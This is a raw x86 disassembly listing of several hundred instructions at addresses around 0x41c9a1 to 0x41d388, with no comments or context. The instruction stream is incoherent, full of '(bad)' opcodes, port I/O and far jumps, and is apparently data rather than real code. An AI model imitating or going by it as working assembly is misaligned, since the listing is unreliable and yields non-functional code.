  41c9a1:	std    
  41c9a2:	push   ss
  41c9a3:	dec    eax
  41c9a4:	pop    edx
  41c9a5:	call   0xa6f2:0x12f71ff7
  41c9ac:	dec    eax
  41c9ad:	out    0x38,eax
  41c9af:	xchg   ch,bh
  41c9b1:	test   eax,0x352888a7
  41c9b6:	adc    edx,ebx
  41c9b8:	xor    DWORD PTR [edx+0x43f8358a],ebx
  41c9be:	pop    edi
  41c9bf:	push   ss
  41c9c0:	push   ecx
  41c9c1:	and    eax,0x85c2409c
  41c9c6:	add    al,bl
  41c9c8:	inc    esp
  41c9c9:	mov    ds:0xbd243019,al
  41c9ce:	xor    BYTE PTR [ecx-0x4df4e2fb],cl
  41c9d4:	cmp    eax,DWORD PTR [ebx+0x3646796f]
  41c9da:	jbe    0x41c961
  41c9dc:	pop    ebp
  41c9dd:	fwait
  41c9de:	mov    esi,0xa7d9b5f5
  41c9e3:	or     dh,BYTE PTR [edi+ebx*4-0x6e]
  41c9e7:	lock js 0x41c9d4
  41c9ea:	fs dec ecx
  41c9ec:	jecxz  0x41c9d1
  41c9ee:	dec    ebp
  41c9ef:	sub    BYTE PTR [edi-0x1594823],ah
  41c9f5:	mov    cl,BYTE PTR [esi+0x56]
  41c9f8:	stc    
  41c9f9:	jp     0x41c984
  41c9fb:	(bad)
  41c9fe:	add    BYTE PTR [esi-0x4e0ff87b],al
  41ca04:	jae    0x41c99f
  41ca06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca07:	stc    
  41ca08:	mov    esp,0xa0b0c425
  41ca0d:	push   edx
  41ca0e:	or     cl,BYTE PTR [ebx]
  41ca10:	add    eax,DWORD PTR [eax]
	...
  41ca72:	add    BYTE PTR [eax],al
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	mov    ecx,0xadae5e69
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0x55000001,al
  41ca8d:	cmp    eax,0x67302b0f
  41ca92:	push   edx
  41ca93:	mov    ebx,0xf29ce4f2
  41ca98:	(bad)  
  41ca99:	sub    esp,DWORD PTR [ecx]
  41ca9b:	sar    DWORD PTR [edx],0xae
  41ca9e:	xchg   esp,eax
  41ca9f:	and    ah,BYTE PTR [esp+esi*8]
  41caa2:	jne    0x41cb04
  41caa4:	(bad)  
  41caa5:	jnp    0x41ca59
  41caa7:	pop    ss
  41caa8:	cmp    DWORD PTR [ebp-0x35],eax
  41caab:	mov    eax,0xadd2d0ae
  41cab0:	xchg   ecx,eax
  41cab1:	mov    esi,edx
  41cab3:	sub    al,0xa5
  41cab5:	mov    ds:0x61bbbc49,eax
  41caba:	xor    al,0x71
  41cabc:	call   DWORD PTR ds:0x4c8e0f97
  41cac2:	shl    DWORD PTR [esi+0x61ce782b],0x71
  41cac9:	adc    al,0x73
  41cacb:	or     DWORD PTR [edx+0x78f2d0d1],esi
  41cad1:	cmp    eax,ebx
  41cad3:	std    
  41cad4:	retf   0xdee2
  41cad7:	or     al,0xad
  41cad9:	xlat   BYTE PTR ds:[ebx]
  41cada:	jecxz  0x41cb13
  41cadc:	data16 lahf 
  41cade:	inc    ecx
  41cadf:	into   
  41cae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae1:	xor    al,0xe7
  41cae3:	aaa    
  41cae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae5:	dec    esi
  41cae6:	loope  0x41cb12
  41cae8:	jmp    0x1c2a1ece
  41caed:	dec    esp
  41caee:	sbb    dh,bh
  41caf0:	fcom   QWORD PTR [edi]
  41caf2:	or     BYTE PTR [eax+0x697b8e19],bl
  41caf8:	aas    
  41caf9:	adc    ebp,DWORD PTR [edi+0x14]
  41cafc:	sbb    DWORD PTR [edi-0x5d66cd5a],ebx
  41cb02:	test   BYTE PTR [esi],cl
  41cb04:	mov    ebp,0xd6b445e5
  41cb09:	pop    es
  41cb0a:	xor    eax,DWORD PTR [edx+0x7]
  41cb0d:	jle    0x41cab8
  41cb0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb10:	mov    ebp,0xbdb8e014
  41cb15:	add    eax,0xbf05c641
  41cb1a:	jecxz  0x41cb08
  41cb1c:	lods   al,BYTE PTR ds:[esi]
  41cb1d:	stos   DWORD PTR es:[edi],eax
  41cb1e:	loop   0x41cac1
  41cb20:	and    BYTE PTR [ebx-0x25acf0f0],0xfc
  41cb27:	xchg   DWORD PTR [ebx],edi
  41cb29:	or     al,0x52
  41cb2b:	adc    DWORD PTR [ebp-0x77cbd4bb],ebx
  41cb31:	mov    ah,0xca
  41cb33:	mov    eax,ds:0x1298f6c
  41cb38:	cdq    
  41cb39:	xchg   BYTE PTR [edx],bl
  41cb3b:	pop    ebp
  41cb3c:	jecxz  0x41cb8a
  41cb3e:	lock sbb esp,DWORD PTR [ecx-0x5]
  41cb42:	xor    bh,BYTE PTR [esi+0x49]
  41cb45:	mov    ds:0xbee30a6f,al
  41cb4a:	out    dx,eax
  41cb4b:	and    DWORD PTR [edi],eax
  41cb4d:	pop    ebx
  41cb4e:	arpl   WORD PTR [edi],ax
  41cb50:	push   esp
  41cb51:	and    al,0x3e
  41cb53:	add    al,0x45
  41cb55:	jb     0x41cbcb
  41cb57:	aad    0x21
  41cb59:	cmp    DWORD PTR [ecx],0xffffff83
  41cb5c:	sbb    eax,0x8fc0c0d0
  41cb61:	add    al,0x43
  41cb63:	out    dx,eax
  41cb64:	xlat   BYTE PTR ds:[ebx]
  41cb65:	push   ebp
  41cb66:	lahf   
  41cb67:	dec    esp
  41cb68:	rcr    BYTE PTR ds:0xd0a60269,0xb5
  41cb6f:	dec    edx
  41cb70:	fidivr DWORD PTR [edi+edi*8+0x4a]
  41cb74:	mov    ds:0xdfb81ede,al
  41cb79:	lea    edx,ds:0x561ddfa0
  41cb7f:	gs loope 0x41cb53
  41cb82:	sbb    BYTE PTR [esp+ebp*2-0x16],ah
  41cb86:	test   al,0x38
  41cb88:	mov    al,ds:0xca4cd9d3
  41cb8d:	adc    eax,0x741c05
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x50ab2322
  41cc03:	xchg   DWORD PTR [edx+0x5000131],esi
  41cc09:	add    DWORD PTR [eax],eax
  41cc0b:	add    dl,cl
  41cc0d:	or     al,0x8c
  41cc0f:	mov    ecx,0xa941f7ea
  41cc14:	mov    eax,ds:0x5242ee08
  41cc19:	mov    ds:0x1378468c,eax
  41cc1e:	add    edx,ebx
  41cc20:	and    eax,0x7d2f76e5
  41cc25:	sub    dh,0xd
  41cc28:	sbb    dh,al
  41cc2a:	into   
  41cc2b:	xchg   esi,eax
  41cc2c:	fistp  QWORD PTR [esi+0x76e2aae5]
  41cc32:	mov    eax,DWORD PTR [edx]
  41cc34:	in     eax,0x73
  41cc36:	je     0x41cc7e
  41cc38:	jge    0xb23026de
  41cc3e:	xor    edx,DWORD PTR [ecx+0x50]
  41cc41:	in     al,dx
  41cc42:	sbb    BYTE PTR [ebx],bl
  41cc44:	in     al,dx
  41cc45:	push   ds
  41cc46:	fwait
  41cc47:	fs jp  0x41cc1d
  41cc4a:	mov    DWORD PTR [esi+0x24],ebx
  41cc4d:	pop    ebx
  41cc4e:	inc    edi
  41cc4f:	and    eax,0xd2685010
  41cc54:	lea    eax,[edx-0x21]
  41cc57:	mov    ch,0xbc
  41cc59:	xchg   edx,eax
  41cc5a:	inc    ecx
  41cc5b:	mov    al,0xc9
  41cc5d:	sbb    al,0x86
  41cc5f:	pop    edi
  41cc60:	sub    DWORD PTR [esi+0x3078afc5],eax
  41cc66:	push   0x22
  41cc68:	inc    edx
  41cc69:	mov    ebp,0x1534eb41
  41cc6e:	pop    edi
  41cc6f:	sti    
  41cc70:	push   ecx
  41cc71:	stc    
  41cc72:	fs adc al,0xa8
  41cc75:	add    ebx,DWORD PTR [edx*1+0x707484bb]
  41cc7c:	mov    eax,0x5c556d6f
  41cc81:	xchg   ebp,eax
  41cc82:	push   ebp
  41cc83:	(bad)  
  41cc84:	ins    DWORD PTR es:[edi],dx
  41cc85:	inc    edx
  41cc86:	lea    ecx,[ebx]
  41cc88:	xchg   esi,eax
  41cc89:	add    esi,esp
  41cc8b:	add    edi,DWORD PTR [ebp-0x27]
  41cc8e:	push   ss
  41cc8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc90:	das    
  41cc91:	dec    esp
  41cc92:	in     eax,dx
  41cc93:	lea    edi,[esi-0x79]
  41cc96:	xchg   edx,eax
  41cc97:	mov    al,0x4
  41cc99:	adc    BYTE PTR [ebp+edx*1+0x72],dl
  41cc9d:	pop    edx
  41cc9e:	xchg   edi,eax
  41cc9f:	and    dh,BYTE PTR [edx]
  41cca1:	pushf  
  41cca2:	sahf   
  41cca3:	push   edi
  41cca4:	jle    0x41cc3a
  41cca6:	sub    BYTE PTR [ebx-0x2b],bl
  41cca9:	fdivr  st,st(7)
  41ccab:	(bad)  [esp+ebx*4-0x23bc27]
  41ccb2:	jae    0x41cce4
  41ccb4:	and    bl,BYTE PTR [esp+edx*2]
  41ccb7:	(bad)  
  41ccb8:	cmp    dl,cl
  41ccba:	mov    edx,0xaf83f380
  41ccc0:	les    ecx,FWORD PTR [esp+eiz*4+0x7b]
  41ccc4:	ins    BYTE PTR es:[edi],dx
  41ccc5:	imul   ecx,DWORD PTR [eax+0x4b],0x5f
  41ccc9:	dec    ebp
  41ccca:	scas   al,BYTE PTR es:[edi]
  41cccb:	push   edi
  41cccc:	rcl    dl,0x5e
  41cccf:	add    ch,BYTE PTR [ecx-0x7b]
  41ccd2:	fucom  st(4)
  41ccd4:	pop    ds
  41ccd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd6:	or     BYTE PTR [ecx],dl
  41ccd8:	cmp    DWORD PTR [edx],edi
  41ccda:	sahf   
  41ccdb:	jmp    0xe6f4:0xbd916ee
  41cce2:	xor    eax,0x9f28d227
  41cce7:	sbb    BYTE PTR [esi-0x3b],0x40
  41cceb:	pop    ebx
  41ccec:	shr    DWORD PTR [ecx-0x36],0xb
  41ccf0:	mov    eax,0x93fc95be
  41ccf5:	je     0x41cd66
  41ccf7:	cwde   
  41ccf8:	rcl    DWORD PTR ds:0xddff53d6,cl
  41ccfe:	scas   al,BYTE PTR es:[edi]
  41ccff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd00:	sbb    BYTE PTR ds:0x69e85d5d,ah
  41cd06:	ins    BYTE PTR es:[edi],dx
  41cd07:	out    dx,eax
  41cd08:	jae    0x41cd77
  41cd0a:	call   0xea99:0x77f5bdec
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    eax,ds:0xb747e987
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR ds:0xf7000001,al
  41cd8d:	gs jle 0x41cd68
  41cd90:	xchg   DWORD PTR [esi+edx*8+0xc9920d9],ecx
  41cd97:	push   edi
  41cd98:	rcl    BYTE PTR [edx-0x42],cl
  41cd9b:	sbb    al,0xe1
  41cd9d:	fwait
  41cd9e:	shl    BYTE PTR [ebx+edi*4-0x5a],0x82
  41cda3:	xchg   ebx,eax
  41cda4:	fadd   QWORD PTR [eax-0x57]
  41cda7:	pop    esp
  41cda8:	dec    ebx
  41cda9:	stc    
  41cdaa:	ret    0xdaeb
  41cdad:	mov    ebp,0xbc6fb23d
  41cdb3:	inc    ecx
  41cdb4:	or     al,BYTE PTR [esi+esi*8-0x56]
  41cdb8:	dec    eax
  41cdb9:	xor    BYTE PTR [esi+eax*1],0xc6
  41cdbd:	or     DWORD PTR [esi-0x20a88406],0xa4ae4832
  41cdc7:	add    BYTE PTR [eax+0x323ea660],ch
  41cdcd:	mov    bh,0x46
  41cdcf:	mov    eax,ds:0x68f96358
  41cdd4:	dec    ebx
  41cdd5:	or     ebp,DWORD PTR [ebx]
  41cdd7:	mov    eax,0xd7c29a0a
  41cddc:	rcr    BYTE PTR [edi],0x7f
  41cddf:	sub    al,0x78
  41cde1:	in     eax,0xd8
  41cde3:	fisubr DWORD PTR [eax]
  41cde5:	aas    
  41cde6:	arpl   WORD PTR [ecx+0x25e43fa8],di
  41cdec:	xchg   DWORD PTR [edx-0x4b02a8cb],ebx
  41cdf2:	lock xor DWORD PTR [edx+0x662c67fc],ebp
  41cdf9:	addr16 pop esi
  41cdfb:	fidivr DWORD PTR [edi-0x71]
  41cdfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdff:	and    ebp,DWORD PTR [ecx]
  41ce01:	fxch   st(7)
  41ce03:	rcl    DWORD PTR [ebx+0x1cb413a3],cl
  41ce09:	mov    esp,0x5bdf4419
  41ce0e:	nop
  41ce0f:	fild   WORD PTR [ebx]
  41ce11:	fmul   QWORD PTR ds:[ebx+0x9]
  41ce15:	push   esp
  41ce16:	call   0x5b08:0xf9716eda
  41ce1d:	xchg   ebx,eax
  41ce1e:	xchg   ecx,eax
  41ce1f:	mov    dh,0x4f
  41ce21:	jnp    0x41cdd5
  41ce23:	mov    dl,0xed
  41ce25:	pop    ebp
  41ce26:	mov    ds:0x1b76acd9,al
  41ce2b:	loope  0x41cdb5
  41ce2d:	jle    0x41cea9
  41ce2f:	xor    edi,DWORD PTR [edi]
  41ce31:	mov    dh,0x50
  41ce33:	out    dx,al
  41ce34:	push   ebp
  41ce35:	(bad)  
  41ce36:	adc    BYTE PTR [esp+ebx*2+0x1c],al
  41ce3a:	scas   eax,DWORD PTR es:[edi]
  41ce3b:	sub    eax,DWORD PTR [edx]
  41ce3d:	repnz add DWORD PTR [ebp-0x27a86c8b],ecx
  41ce44:	xchg   ebx,eax
  41ce45:	sbb    BYTE PTR [edi+edx*8-0x218ce57d],cl
  41ce4c:	inc    esp
  41ce4d:	retf   0x6a60
  41ce50:	cli    
  41ce51:	ja     0x41cecb
  41ce53:	es iret 
  41ce55:	fcomp  DWORD PTR [ebp+0x0]
  41ce58:	mov    ds:0x7da8113c,eax
  41ce5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce5e:	cmp    eax,0xd86da06e
  41ce63:	je     0x41ce3e
  41ce65:	rol    BYTE PTR [ebp+0x25],cl
  41ce68:	cli    
  41ce69:	cmp    ch,cl
  41ce6b:	add    BYTE PTR [edi+0x5b4d6b0f],0xb0
  41ce72:	mov    al,ds:0x23fe57d7
  41ce77:	lods   al,BYTE PTR ds:[esi]
  41ce78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce79:	dec    esi
  41ce7a:	add    bh,ch
  41ce7c:	fstp   st(7)
  41ce7e:	cmp    BYTE PTR [ebx],dl
  41ce80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce81:	lea    eax,[eax-0x5cfbf99a]
  41ce87:	gs mov esp,0xa970911c
  41ce8d:	and    bl,BYTE PTR [ecx]
  41ce8f:	jge    0x41ce23
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	sbb    eax,0xbc9520dc
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0x2e000001,al
  41cf0d:	inc    eax
  41cf0e:	enter  0x4b7d,0x9
  41cf12:	cmp    ecx,DWORD PTR [ebx+0x7e]
  41cf15:	pop    ss
  41cf16:	pop    ebp
  41cf17:	ror    BYTE PTR [eax-0x6c92538d],1
  41cf1d:	sbb    eax,0x83a82ea0
  41cf22:	cmp    eax,0x9defae44
  41cf27:	pop    es
  41cf28:	addr16 inc edx
  41cf2a:	adc    dh,BYTE PTR [edx+0x66cc7a80]
  41cf30:	and    al,0x3a
  41cf32:	push   ebx
  41cf33:	in     eax,dx
  41cf34:	jg     0x41cfa5
  41cf36:	lods   eax,DWORD PTR ds:[esi]
  41cf37:	xchg   ecx,eax
  41cf38:	repnz int3 
  41cf3a:	dec    edx
  41cf3b:	push   esp
  41cf3c:	arpl   WORD PTR [edx+0x33],sp
  41cf3f:	xchg   ebx,eax
  41cf40:	pop    eax
  41cf41:	lods   eax,DWORD PTR ds:[esi]
  41cf42:	mov    ah,0x9d
  41cf44:	xor    esp,esp
  41cf46:	jo     0x41cf06
  41cf48:	jecxz  0x41cf12
  41cf4a:	ss aam 0x33
  41cf4d:	nop
  41cf4e:	pop    esp
  41cf4f:	ja     0x41cedd
  41cf51:	xchg   edi,eax
  41cf52:	jne    0x41cee8
  41cf54:	das    
  41cf55:	mov    al,0x41
  41cf57:	xor    cl,ah
  41cf59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf5a:	js     0x41cf7a
  41cf5c:	xchg   esp,eax
  41cf5d:	and    edx,DWORD PTR [esi+eax*4]
  41cf60:	fistp  DWORD PTR [edx+0x1a664fa6]
  41cf66:	(bad)
  41cf6a:	jge    0x41cf89
  41cf6c:	jbe    0x41cfc9
  41cf6e:	std    
  41cf6f:	push   ecx
  41cf70:	add    al,0x68
  41cf72:	ds jbe 0x41cf19
  41cf75:	and    eax,0xdf5dda3d
  41cf7a:	xchg   BYTE PTR [eax],dh
  41cf7c:	xchg   ebp,eax
  41cf7d:	mov    ecx,0xcd19b60d
  41cf82:	adc    dh,dh
  41cf84:	fwait
  41cf85:	push   edi
  41cf86:	push   esi
  41cf87:	dec    ebx
  41cf88:	ret    
  41cf89:	scas   eax,DWORD PTR es:[edi]
  41cf8a:	out    dx,al
  41cf8b:	leave  
  41cf8c:	test   DWORD PTR ds:0x4670b57e,edi
  41cf92:	and    DWORD PTR [ebp+0x19505132],edi
  41cf98:	jmp    0x41cfdd
  41cf9a:	ret    0x744c
  41cf9d:	and    al,0x9d
  41cf9f:	out    dx,eax
  41cfa0:	(bad)  
  41cfa1:	scas   al,BYTE PTR es:[edi]
  41cfa2:	gs adc al,0x6f
  41cfa5:	mov    esp,0x2b197b80
  41cfaa:	loopne 0x41cfb8
  41cfac:	int3   
  41cfad:	inc    ebx
  41cfae:	out    dx,al
  41cfaf:	jb     0x41d01e
  41cfb1:	es sahf 
  41cfb3:	xor    eax,0xf6ee0a65
  41cfb8:	int    0xbf
  41cfba:	mov    eax,ds:0xb8f032b8
  41cfbf:	xor    DWORD PTR ds:0x12286f30,0x67
  41cfc6:	mov    ebx,0xc1380534
  41cfcb:	xchg   DWORD PTR [esi],eax
  41cfcd:	inc    eax
  41cfce:	sbb    ebp,DWORD PTR [esp+eax*4]
  41cfd1:	jno    0x41d005
  41cfd3:	data16 jo 0x41cf7d
  41cfd6:	adc    al,0x1
  41cfd8:	sub    BYTE PTR [edi-0x7d],ah
  41cfdb:	aas    
  41cfdc:	nop
  41cfdd:	and    eax,0xea57e648
  41cfe2:	jmp    0x41cfe3
  41cfe4:	inc    edx
  41cfe5:	fucomp st(5)
  41cfe7:	sub    eax,0xfef90ace
  41cfec:	inc    esi
  41cfed:	jmpw   0xfa4c
  41cff1:	inc    edx
  41cff2:	rol    DWORD PTR [ecx],1
  41cff4:	inc    esp
  41cff5:	repz add dl,bh
  41cff8:	pop    es
  41cff9:	push   ecx
  41cffa:	int3   
  41cffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffc:	scas   eax,DWORD PTR es:[edi]
  41cffd:	push   DWORD PTR [edi+ecx*8-0x78]
  41d001:	ret    
  41d002:	es push 0xffffffd6
  41d005:	add    edi,DWORD PTR [esi]
  41d007:	mov    ebx,0x6cb5ebde
  41d00c:	and    esp,DWORD PTR [ebx-0xe]
  41d00f:	aam    0x3
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x65514bbd
  41d083:	enter  0x34c1,0x1
  41d087:	add    BYTE PTR ds:0x7b000001,al
  41d08d:	ins    DWORD PTR es:[edi],dx
  41d08e:	dec    edi
  41d08f:	aad    0x94
  41d091:	jmp    0xced8417
  41d096:	cld    
  41d097:	inc    esi
  41d098:	fs jle 0x41d062
  41d09b:	push   cs
  41d09c:	mov    ch,0x1b
  41d09e:	lea    edx,[ecx+0x4b]
  41d0a1:	pop    edi
  41d0a2:	retf   
  41d0a3:	adc    BYTE PTR [edx-0x4b],0x37
  41d0a7:	or     bh,bh
  41d0a9:	xchg   edi,eax
  41d0aa:	mov    ?,WORD PTR [eax]
  41d0ac:	push   es
  41d0ad:	xchg   ebx,eax
  41d0ae:	or     DWORD PTR [esi+0x2b],0xb787c4e2
  41d0b5:	and    bl,BYTE PTR [edx]
  41d0b7:	rol    BYTE PTR [edi],0xd
  41d0ba:	clc    
  41d0bb:	arpl   ax,si
  41d0bd:	mov    esi,0x567cc92e
  41d0c2:	pop    esp
  41d0c3:	cmp    DWORD PTR [edi+0x1808ed37],ebx
  41d0c9:	cwde   
  41d0ca:	push   edx
  41d0cb:	aaa    
  41d0cc:	cdq    
  41d0cd:	in     eax,0x6a
  41d0cf:	pop    ss
  41d0d0:	dec    ebx
  41d0d1:	popa   
  41d0d2:	aam    0xa6
  41d0d4:	out    dx,eax
  41d0d5:	push   ecx
  41d0d6:	loopne 0x41d05a
  41d0d8:	ss mov cl,0x1b
  41d0db:	or     ah,dl
  41d0dd:	adc    al,0x1f
  41d0df:	pop    ebp
  41d0e0:	mov    esi,0x9a78fb73
  41d0e5:	mov    al,0xb5
  41d0e7:	les    ecx,FWORD PTR [edi-0x6b]
  41d0ea:	lea    esp,[ecx+0x7]
  41d0ed:	sub    bl,dh
  41d0ef:	sbb    al,0x10
  41d0f1:	in     eax,0xbe
  41d0f3:	pop    ebp
  41d0f4:	mul    BYTE PTR [edx+0x4]
  41d0f7:	std    
  41d0f8:	sbb    BYTE PTR [edx+eiz*4+0x7],dl
  41d0fc:	into   
  41d0fd:	xchg   esp,eax
  41d0fe:	imul   eax,DWORD PTR [esi+0x3eeaa41a],0xc51c4c3a
  41d108:	jmp    0xcf261131
  41d10d:	push   esi
  41d10e:	adc    eax,ebp
  41d110:	inc    edx
  41d111:	adc    al,dh
  41d113:	or     DWORD PTR [edi],0x3f1206fa
  41d119:	ret    0xac1c
  41d11c:	and    eax,0x4cadfac7
  41d121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d122:	popf   
  41d123:	mov    ah,0xa9
  41d125:	add    edx,ecx
  41d127:	pop    ecx
  41d128:	push   esi
  41d129:	ret    
  41d12a:	popa   
  41d12b:	sbb    ch,bh
  41d12d:	into   
  41d12e:	adc    eax,0x30255ffb
  41d133:	ins    DWORD PTR es:[edi],dx
  41d134:	lods   al,BYTE PTR ds:[esi]
  41d135:	adc    al,0x8e
  41d137:	and    BYTE PTR [eax+eiz*4],bl
  41d13a:	loope  0x41d0dd
  41d13c:	pushf  
  41d13d:	daa    
  41d13e:	iret   
  41d13f:	jne    0x41d153
  41d141:	dec    esi
  41d142:	sub    eax,0x4f3f569a
  41d147:	je     0x41d0f1
  41d149:	mov    ch,0xc9
  41d14b:	adc    ebp,DWORD PTR [ebp-0x5a03bdf1]
  41d151:	xchg   edi,eax
  41d152:	and    ebp,esp
  41d154:	mov    edi,0x9b13571c
  41d159:	ror    DWORD PTR [edx-0x7a],1
  41d15c:	jmp    0x41d175
  41d15e:	lds    ebp,FWORD PTR [ecx+ebp*4-0x2aef122b]
  41d165:	enter  0xf821,0x5e
  41d169:	cmp    ah,BYTE PTR [edi]
  41d16b:	xor    DWORD PTR [ebp+0x477602c1],eax
  41d171:	xchg   BYTE PTR [esi-0x595fc834],bh
  41d177:	call   DWORD PTR [ebx*8-0x4e476fdc]
  41d17e:	adc    dl,BYTE PTR [esp+eiz*2+0x676a6a1e]
  41d185:	adc    al,0x98
  41d187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d188:	push   ecx
  41d189:	mov    ch,0xca
  41d18b:	cwde   
  41d18c:	add    ebx,DWORD PTR [ecx+0x58]
  41d18f:	pop    esp
  41d190:	mov    edi,0x0
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	push   edi
  41d201:	jae    0x41d18d
  41d203:	fcmovb st,st(6)
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	mov    ecx,0x97b25cce
  41d211:	enter  0xbc1d,0x8e
  41d215:	jnp    0x41d1e1
  41d217:	mov    dl,ah
  41d219:	outs   dx,DWORD PTR ds:[esi]
  41d21a:	imul   esi,DWORD PTR [eax+0x31ffe706],0x33caaf06
  41d224:	or     eax,DWORD PTR [eax+0x21]
  41d227:	mov    dl,0x3f
  41d229:	cmp    al,0x4a
  41d22b:	dec    esp
  41d22c:	adc    ebx,DWORD PTR [eax-0x369f89f4]
  41d232:	test   bl,bh
  41d234:	lea    ecx,[ecx]
  41d236:	xlat   BYTE PTR ds:[ebx]
  41d237:	fs cli 
  41d239:	fisubr WORD PTR [esi]
  41d23b:	push   0xffffffff
  41d23d:	or     DWORD PTR [ebx+ebx*8],ebp
  41d240:	inc    ecx
  41d241:	leave  
  41d242:	add    ecx,DWORD PTR [edx+0x13a9efd]
  41d248:	retf   
  41d249:	xchg   edi,eax
  41d24a:	call   0x49957845
  41d24f:	jnp    0x41d1e2
  41d251:	mov    dh,0x88
  41d253:	dec    esi
  41d254:	mov    bl,0x24
  41d256:	icebp  
  41d257:	jmp    0x41d2ab
  41d259:	in     eax,dx
  41d25a:	enter  0x9ce2,0x72
  41d25e:	push   ss
  41d25f:	fmul   st(6),st
  41d261:	adc    esp,ebx
  41d263:	cwde   
  41d264:	cmc    
  41d265:	stos   DWORD PTR es:[edi],eax
  41d266:	xchg   edi,eax
  41d267:	dec    ebx
  41d268:	inc    eax
  41d269:	(bad)  
  41d26a:	mov    ds:0xb65d8ad5,al
  41d26f:	fs inc esi
  41d271:	cmp    eax,0xdb836123
  41d276:	mov    edx,0xa2606e8c
  41d27b:	call   0xc481:0xa7228cf3
  41d282:	aaa    
  41d283:	pop    edi
  41d284:	xor    DWORD PTR [esi],esp
  41d286:	pop    ss
  41d287:	lods   al,BYTE PTR ds:[esi]
  41d288:	das    
  41d289:	stos   DWORD PTR es:[edi],eax
  41d28a:	repnz ud2 
  41d28d:	xor    edi,eax
  41d28f:	push   ebp
  41d290:	sti    
  41d291:	adc    bl,ch
  41d293:	loopne 0x41d27e
  41d295:	or     al,0xf8
  41d297:	ds pop esi
  41d299:	adc    eax,0x3b55311c
  41d29e:	mov    esp,ebx
  41d2a0:	dec    ebp
  41d2a1:	cmc    
  41d2a2:	retf   0x4790
  41d2a5:	stos   BYTE PTR es:[edi],al
  41d2a6:	inc    esi
  41d2a7:	outs   dx,BYTE PTR ds:[esi]
  41d2a8:	js     0x41d329
  41d2aa:	push   esp
  41d2ab:	sbb    eax,0x63e73f8
  41d2b0:	xchg   ebp,eax
  41d2b1:	ss jecxz 0x41d25c
  41d2b4:	aad    0x25
  41d2b6:	or     BYTE PTR gs:[ebx-0x142d993d],0xb
  41d2be:	in     al,dx
  41d2bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2c0:	jmp    0x9a3b27be
  41d2c5:	retf   
  41d2c6:	xor    al,0x10
  41d2c8:	cmp    esi,DWORD PTR [ecx]
  41d2ca:	jb     0x41d2b4
  41d2cc:	mov    ds:0x5a629745,al
  41d2d1:	jns    0x41d2b9
  41d2d3:	aas    
  41d2d4:	aad    0x9a
  41d2d6:	lahf   
  41d2d7:	arpl   WORD PTR [edi-0x3d],cx
  41d2da:	adc    BYTE PTR [esi],bh
  41d2dc:	int    0xd1
  41d2de:	lahf   
  41d2df:	cdq    
  41d2e0:	sahf   
  41d2e1:	test   eax,0x403d8ab7
  41d2e6:	jnp    0x41d281
  41d2e8:	test   BYTE PTR [eax+edx*1-0x5c90faec],dl
  41d2ef:	mov    edi,0x52896de8
  41d2f4:	or     eax,ebp
  41d2f6:	adc    dl,BYTE PTR [ebx-0x58b7ade4]
  41d2fc:	or     BYTE PTR [edi+0x62fb82f1],dl
  41d302:	out    dx,eax
  41d303:	(bad)  
  41d304:	jle    0x41d2ff
  41d306:	fcmovu st,st(0)
  41d308:	call   0xb597c3c9
  41d30d:	inc    esi
  41d30e:	jo     0x41d2fa
  41d310:	pop    ebp
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x2c],0xd3
  41d382:	push   es
  41d383:	mov    ebx,0x136cb
  41d388:	add    eax,0x9d000001
